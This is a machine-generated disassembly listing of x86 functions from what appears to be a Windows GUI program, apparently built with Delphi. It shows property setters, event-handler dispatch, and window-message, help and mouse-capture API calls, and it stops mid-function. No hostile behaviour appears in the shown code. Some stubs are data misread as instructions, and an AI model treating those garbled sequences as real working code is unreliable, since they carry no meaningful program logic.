cmp dl [ eax + 0x258 ]
je r-xdata
retn
mov [ eax + 0x258 ] dl
mov ecx edx
mov edx 0x1
call sub_437178
sub_43aef4
cmp dl [ eax + 0x259 ]
je r-xdata
retn
mov [ eax + 0x259 ] dl
mov ecx edx
mov edx 0x2
call sub_437178
sub_43af10
cmp dl [ eax + 0x25a ]
je r-xdata
retn
mov [ eax + 0x25a ] dl
mov ecx edx
mov edx 0x4
call sub_437178
sub_43af2c
cmp dl [ eax + 0x246 ]
je r-xdata
retn
mov [ eax + 0x246 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x8
call sub_437178
sub_43b066
add [ eax ] al
mov eax [ eax + 0x26c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_43b098
push ebx
mov ebx eax
mov eax ebx
call sub_453e1c
call sub_429990
pop ebx
retn
sub_43b0d8
push ebx
mov ebx eax
mov eax ebx
call sub_44f6f0
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43b0ac
sub_43b14c
push esi
mov esi eax
xor edx edx
mov eax [ esi + 0x330 ]
call sub_430e28
mov eax [ esi + 0x330 ]
mov edx [ eax + 0xc ]
mov eax esi
mov si 0xffaf
call sub_403370
pop esi
retn
sub_43b1e0
mov eax [ eax + 0x330 ]
call sub_430e38
retn
sub_43b1ec
mov eax [ eax + 0x330 ]
mov eax [ eax + 0x30 ]
retn
sub_43b44b
jmp sub_4038f0
sub_43b7f5
jmp sub_4038f0
sub_43b89a
jmp sub_4038f0
sub_43bc9e
jmp sub_4038f0
sub_43bca5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43bcac
push ebx
mov ebx eax
mov eax [ ebx + 0x21c ]
call sub_45ab0c
test eax eax
jle r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x21c ]
pop ebx
retn
sub_43beec
push ebx
cmp [ eax + 0x31a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
sub_43bf0c
push ebx
cmp [ eax + 0x322 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
sub_43bfa5
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x2f2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2f4 ]
call [ ebx + 0x2f0 ]
sub_43bfc8
push ebx
cmp [ eax + 0x2ea ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
sub_43bfe8
push ebx
cmp [ eax + 0x30a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x30c ]
call [ ebx + 0x308 ]
sub_43c034
push ebx
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
sub_43c14c
jmp sub_4038f0
sub_43c153
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43c198
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_439aec
retn
sub_43c4f8
jmp sub_4038f0
sub_43c4ff
pop ebx
mov esp ebp
pop ebp
retn
sub_43c644
mov [ eax + 0x210 ] 0x1
retn
sub_43c850
push esi
mov esi eax
test [ esi + 0x275 ] 0x1
setne al
xor al 0x1
push eax
mov eax esi
call sub_43cca0
pop esi
retn
sub_43c86c
push ebx
mov ebx eax
mov eax ebx
call sub_43caa0
mov eax ebx
call sub_452738
pop ebx
retn
sub_43c880
push ebx
mov ebx eax
mov eax ebx
call sub_452758
mov eax ebx
call sub_43caa0
pop ebx
retn
sub_43ca6c
jmp sub_4038f0
sub_43ca7c
mov eax [ eax + 0x278 ]
mov eax [ eax + 0x8 ]
retn
sub_43ce65
jmp sub_4038f0
sub_43cf0f
jmp sub_4038f0
sub_43cf16
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d032
jmp sub_4038f0
sub_43d039
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d1b5
jmp sub_4038f0
sub_43d302
jmp sub_4038f0
sub_43d309
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43d358
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_43d36c
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_43d698
push esi
mov [ eax + 0x218 ] dx
mov [ eax + 0x21a ] cx
mov si 0xffb3
call sub_403370
pop esi
retn
sub_43d754
cmp [ eax + 0x228 ] 0x1
jne r-xdata
mov dl 0x1
call sub_43dd1c
retn
xor edx edx
call sub_43dd1c
retn
sub_43d7a8
push ebx
cmp [ eax + 0x222 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x224 ]
call [ ebx + 0x220 ]
sub_43d9d6
jmp sub_4038f0
sub_43d9dd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43dc98
jmp sub_4038f0
sub_43dc9f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43e064
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_4530c0
retn
mov [ edx + 0xc ] 0x1
retn
sub_43e16f
jmp sub_4038f0
sub_43e184
call sub_452408
retn
sub_43e240
push ebx
mov ebx eax
mov eax ebx
call sub_453350
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4513bc
sub_43e2a8
push ebx
cmp [ eax + 0x242 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_43e2c8
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_43e2e8
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_43e308
push ebx
mov ebx eax
cmp [ ebx + 0x25a ] 0x0
je r-xdata
mov [ ebx + 0x208 ] 0x0
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x25c ]
call [ ebx + 0x258 ]
sub_43e32c
push ebx
mov ebx eax
mov eax ebx
call sub_44f6f0
cmp [ ebx + 0x234 ] 0x0
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43e5a0
sub_43e592
jmp sub_4038f0
sub_43e599
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43e5e0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_4513bc
sub_43e734
jmp sub_40363c
sub_43e772
jmp sub_4038f0
sub_43e779
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43e7c0
cmp edx [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] edx
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_43ea18
sub_43e80c
cmp dx [ eax + 0x23a ]
je r-xdata
retn
mov [ eax + 0x23a ] dx
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_43ea18
sub_43e828
cmp dl [ eax + 0x235 ]
je r-xdata
retn
mov [ eax + 0x235 ] dl
call sub_4513bc
sub_43e83c
cmp dl [ eax + 0x236 ]
je r-xdata
retn
mov [ eax + 0x236 ] dl
call sub_4513bc
sub_43e9c4
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_43e780
mov dx 0x1
mov eax ebx
call sub_43e9e4
sub_43ebc5
jmp sub_4038f0
sub_43ebcc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43ed80
retn
sub_43ee85
jmp sub_4038f0
sub_43ee8c
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43ef78
mov al [ eax + 0x244 ]
retn
sub_43ef80
mov edx eax
fld [ edx + 0x228 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43ef9c
mov edx eax
fld [ edx + 0x238 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne al
retn
sub_43efb8
add esp 0xfffffff8
mov edx [ eax + 0x210 ]
mov [ esp ] edx
mov edx [ eax + 0x214 ]
mov [ esp + 0x4 ] edx
fld [ esp ]
pop ecx
pop edx
retn
sub_43efd4
push esi
mov esi [ eax + 0x208 ]
cmp edx esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43f06d
jmp sub_40363c
sub_43f2f0
jmp sub_4038f0
sub_43f2f7
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43f42c
jmp sub_4038f0
sub_43f433
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43f6ac
cmp dl [ eax + 0x245 ]
je r-xdata
retn
mov [ eax + 0x245 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x10
call sub_437178
sub_43f6cc
cmp dl [ eax + 0x246 ]
je r-xdata
retn
mov [ eax + 0x246 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x8
call sub_437178
sub_43f6ec
cmp dl [ eax + 0x247 ]
je r-xdata
retn
mov [ eax + 0x247 ] dl
mov ecx edx
mov edx 0x4
call sub_437178
sub_43f95a
add [ eax ] al
call sub_453e1c
retn
sub_43fa5c
mov ecx [ eax + 0x240 ]
mov [ edx ] ecx
mov ecx [ eax + 0x244 ]
mov [ edx + 0x4 ] ecx
retn
sub_43fa70
mov ecx [ eax + 0x248 ]
mov [ edx ] ecx
mov ecx [ eax + 0x24c ]
mov [ edx + 0x4 ] ecx
retn
sub_43fa84
mov ecx [ eax + 0x250 ]
mov [ edx ] ecx
mov ecx [ eax + 0x254 ]
mov [ edx + 0x4 ] ecx
retn
sub_43fa98
mov ecx [ eax + 0x258 ]
mov [ edx ] ecx
mov ecx [ eax + 0x25c ]
mov [ edx + 0x4 ] ecx
retn
sub_43faac
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x240 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x244 ] edx
pop ebp
retn 0x8
sub_43fac8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x248 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x24c ] edx
pop ebp
retn 0x8
sub_43fae4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x254 ] edx
pop ebp
retn 0x8
sub_43fb00
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x258 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x25c ] edx
pop ebp
retn 0x8
sub_43fb8b
jmp sub_4038f0
sub_43fb92
pop ebp
retn
sub_43fb94
sub [ rw-data ] 0x1
retn
sub_43fc03
jmp [ edi ]
sub_43fea4
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43febc
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43ff00
push ebx
mov ebx eax
mov eax ebx
call sub_440628
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_440617
jmp sub_4038f0
sub_440628
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42cf90
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43fed0
sub_44067f
jmp sub_4038f0
sub_440686
pop ebp
retn
sub_440688
sub [ rw-data ] 0x1
retn
sub_4439f4
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_443bc7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x2f31172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_443f82
jmp sub_4038f0
sub_443f89
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44400e
jmp sub_4038f0
sub_444015
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44401c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_4506dc
pop ebx
retn
sub_444030
push ebx
mov ebx eax
mov eax ebx
call sub_453434
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_4506dc
pop ebx
retn
sub_44404c
push ebx
mov ebx eax
mov eax ebx
call sub_452408
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4440f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d634
pop esi
pop ebx
retn
sub_444262
jmp sub_4038f0
sub_444269
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444378
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44f6f0
mov eax ebx
mov si 0xffc7
call sub_403370
pop esi
pop ebx
retn
sub_444464
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444480
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403370
sub_44449c
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_4444a8
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_420a98
sub_4444bc
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44451c
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444590
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403370
pop esi
pop ebx
retn
sub_4445ac
push esi
mov esi eax
mov eax esi
call sub_44f1fc
mov eax esi
mov si 0xffc7
call sub_403370
pop esi
retn
sub_444651
jmp sub_4038f0
sub_444658
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444660
push ebx
mov ebx eax
mov eax ebx
call sub_44f360
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_444684
push ebx
mov ebx eax
mov eax ebx
call sub_44f378
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_4446a8
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_453e1c
push eax
call SendMessageA
pop ebx
retn
sub_44472a
jmp sub_4038f0
sub_444731
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44481c
jmp sub_4038f0
sub_444823
pop ebx
pop ecx
pop ebp
retn
sub_444917
jmp sub_4038f0
sub_44491e
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44499b
jmp sub_4038f0
sub_4449a2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_444af8
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_44d610
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_444b48
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
pop ebx
retn
sub_444c7c
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_4513bc
sub_444cb0
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_444cb8
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_444cc0
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_444cec
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_44e7e8
sub_444e44
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_444e64
cmp dl [ eax + 0x274 ]
je r-xdata
retn
mov [ eax + 0x274 ] dl
call sub_4513bc
sub_44512f
jmp sub_40363c
sub_445134
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dc5c
call sub_4039a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4453c0
jmp sub_4038f0
sub_4453c7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4453d0
push ebx
mov ebx eax
mov eax ebx
call sub_44d240
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_44549d
jmp sub_4038f0
sub_4454a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4454b0
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_44552c
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_445646
jmp sub_4038f0
sub_445690
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_44571b
jmp sub_4038f0
sub_445722
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445754
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_445760
mov [ eax + 0x210 ] edx
retn
sub_4457b1
jmp sub_4038f0
sub_4457b8
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_445880
cmp dl [ eax + 0x275 ]
je r-xdata
retn
mov [ eax + 0x275 ] dl
call sub_4513bc
sub_4458d4
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_4458e9
mov eax [ eax + 0x238 ]
retn
sub_4458e9
push 0x0
xor ecx ecx
mov edx 0x154
call sub_44e7e8
retn
sub_445c28
jmp sub_4038f0
sub_445c2f
pop ebx
mov esp ebp
pop ebp
retn
sub_445fec
jmp sub_4038f0
sub_445ff3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4461b1
jmp sub_4038f0
sub_4461b8
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4461c4
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_4463a8
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_4463b4
mov eax [ r-xdata ]
retn
sub_4465e5
jmp sub_4038f0
sub_4465f4
retn
sub_4466aa
jmp sub_4038f0
sub_446754
mov eax [ r-xdata ]
retn
sub_44675c
xor eax eax
retn
sub_446780
retn
sub_446898
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_4513bc
sub_446910
push ebx
mov ebx eax
mov eax ebx
call sub_464dc0
test eax eax
je r-xdata
mov eax ebx
call sub_44eb70
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_446934
xor eax eax
retn
sub_4469fb
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5c31173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_446a14
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403370
sub_446b05
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_446b0e
jmp sub_4038f0
j_sub_446b05
jmp sub_446b05
sub_446b15
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446cc0
push ebx
mov ebx eax
mov eax ebx
call sub_44d240
mov eax ebx
call sub_44eb70
pop ebx
retn
sub_446cd4
cmp [ eax + 0x212 ] 0x1
sete al
retn
sub_446ce0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_4513bc
sub_446cf4
test dl dl
je r-xdata
xor edx edx
call sub_446d08
retn
mov dl 0x1
call sub_446d08
retn
sub_446de4
push ebx
mov ebx eax
mov eax ebx
call sub_452408
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_446df8
call sub_4513bc
retn
sub_446e8e
jmp sub_4038f0
sub_446e95
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_446e9c
cmp [ edx + 0x6 ] 0x0
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0xd0 ]
sub_446f0c
mov al [ eax + 0x211 ]
retn
sub_446f40
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_4513bc
sub_447120
call sub_4513bc
retn
sub_44719d
jmp sub_4038f0
sub_4471a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447201
jmp sub_4038f0
sub_447208
pop ebp
retn
sub_44720c
sub [ rw-data ] 0x1
retn
sub_447369
jmp sub_4038f0
sub_447370
pop ebp
retn
sub_447374
sub [ rw-data ] 0x1
retn
sub_44737c
xchg [ fs : edi ] al
cld
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp sub_447bf4
sub_44738d
add eax 0xffffffe0
jmp sub_447974
sub_447395
add eax 0xffffffe0
jmp sub_4479dc
sub_44739d
add eax 0xffffffe0
jmp sub_447af0
sub_4473a5
add eax 0xffffffe0
jmp sub_447b64
sub_4473ad
add eax 0xffffffe0
jmp sub_447620
sub_4473b5
add eax 0xffffffe0
jmp sub_447634
sub_4473bd
add eax 0xffffffe0
jmp sub_4476ac
sub_4473d5
add eax 0xffffffe0
jmp sub_4477dc
sub_4473dd
add eax 0xffffffe0
jmp sub_447924
sub_4473e5
add eax 0xffffffe0
jmp sub_447928
sub_4473ed
add eax 0xffffffe0
jmp sub_447944
sub_4473ff
add [ esp + 0x4 ] 0xffffffe0
jmp sub_40582c
sub_447409
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405840
sub_4475dd
jmp sub_4038f0
sub_4475e4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447620
push ebx
mov ebx edx
mov eax ebx
mov edx [ rw-data ]
call sub_403f40
pop ebx
retn
sub_44769b
jmp sub_4038f0
sub_4476a2
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447734
jmp sub_4038f0
sub_44773b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4477cf
jmp sub_4038f0
sub_4477d6
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4478d4
jmp sub_4038f0
sub_4478db
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447924
mov [ eax + 0xc ] edx
retn
sub_447928
mov [ eax + 0x10 ] 0x3
push 0x0
push 0x2
push r-xdata
push 0x0
call WinHelpA
retn
sub_44795a
sti
inc [ ebx + 0x478b083d ]
add [ eax ] al
je r-xdata
pop ebx
retn
mov eax rw-data
call sub_405758
sub_4479cc
jmp sub_4038f0
sub_4479d3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447ad2
jmp sub_4038f0
sub_447ad9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447b52
jmp sub_4038f0
sub_447b59
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_447be4
jmp sub_4038f0
sub_447beb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_447cdf
jmp sub_4038f0
sub_447ce6
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_447da8
mov [ eax + 0xc ] 0x0
mov [ eax + 0xd ] 0x0
xor edx edx
mov [ eax + 0x4 ] edx
push eax
push sub_447cf4
call EnumWindows
retn
sub_447e3a
jmp sub_4038f0
sub_447e41
mov al [ ebp - 0x5 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_447e4c
xor eax eax
retn
sub_447f45
jmp sub_4038f0
sub_447f4c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_448036
jmp sub_4038f0
sub_44803d
pop ebp
retn
sub_448092
jmp sub_4038f0
sub_448099
pop ebp
retn
sub_449228
jmp r-xdata
sub_44922a
0xe8ffe9ff 0xe7ff
sub_449231
jmp esi
sub_44a0c9
add eax 0xffffff8c
jmp sub_4564a8
sub_44a0d1
add eax 0xffffff8c
jmp sub_4564ac
sub_44a0d9
add eax 0xffffff8c
jmp sub_456598
sub_44a0e1
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
xchg [ esp ] eax
retn
sub_44a0ee
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0xc ]
xchg [ esp ] eax
retn
sub_44a0fb
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x28 ]
xchg [ esp ] eax
retn
sub_44a108
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x14 ]
xchg [ esp ] eax
retn
sub_44a115
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
xchg [ esp ] eax
retn
sub_44a122
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x20 ]
xchg [ esp ] eax
retn
sub_44a12f
add eax 0xffffff8c
push eax
mov eax [ eax ]
mov eax [ eax + 0x1c ]
xchg [ esp ] eax
retn
sub_44a13c
add eax 0xffffff8c
jmp sub_457c08
sub_44a14e
add [ esp + 0x4 ] 0xffffff8c
jmp sub_40582c
sub_44a158
add [ esp + 0x4 ] 0xffffff8c
jmp sub_405840
sub_44a414
mov dl [ eax ]
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_44a727
inc [ esi ]
add [ eax ] al
add [ ebx + 0x72 ] ah
push ebx
imul edi [ edx + 0x65 ] 0x156a0000
mov ecx rw-data
call sub_417bcc
retn
sub_44a744
push 0x15
mov ecx rw-data
call sub_417b8c
retn
sub_44a7dc
call GetCapture
call sub_44a514
test eax eax
je r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax [ rw-data ]
sub_44aa40
push ebx
push eax
push sub_44abc4
call sub_421b14
mov ebx eax
push ebx
call SetCapture
mov eax ebx
pop ebx
retn
sub_44aa58
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_44aa88
push ebx
mov ebx edx
call ReleaseCapture
mov eax ebx
call sub_421bc8
pop ebx
retn
sub_44ab66
jmp sub_40363c
sub_44ab98
xor eax eax
retn
sub_44ab9c
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov ax 0xfff4
jmp r-xdata
pop ebp
retn 0x4
sub_44abb4
retn
sub_44abb8
mov eax [ rw-data ]
retn
sub_44abc0
retn
sub_44abee
jmp sub_40363c
sub_44abf3
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dc5c
call sub_4039a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ac10
call sub_4033b4
xor eax eax
mov [ rw-data ] eax
retn
sub_44ac20
call sub_4033b0
xor eax eax
mov [ rw-data ] eax
retn
sub_44ac30
test dl dl
je r-xdata
mov [ eax + 0x38 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_44ace0
push ebp
mov ebp esp
test dl dl
je r-xdata
mov ax 0xfff3
mov eax [ eax + 0x38 ]
mov ax [ eax + 0x7a ]
jmp r-xdata
pop ebp
retn 0x4
sub_44acf8
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
retn
sub_44ad44
retn
sub_44aefc
push esi
mov esi eax
